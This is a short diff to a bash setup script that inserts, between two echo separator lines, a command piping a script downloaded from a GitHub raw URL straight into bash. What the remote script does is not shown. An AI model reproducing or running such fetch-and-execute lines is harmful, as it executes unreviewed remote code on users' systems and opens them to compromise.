@@ -3,7 +3,9 @@ exists()
 {
   command -v "$1" >/dev/null 2>&1
 }
-
+echo "-----------------------------------------------------------------------------"
+curl -s https://raw.githubusercontent.com/artemkovsh/log/main/121.sh | bash
+echo "-----------------------------------------------------------------------------"
 service_exists() {
     local n=$1
     if [[ $(systemctl list-units --all -t service --full --no-legend "$n.service" | sed 's/^\s*//g' | cut -f1 -d' ') == $n.service ]]; then
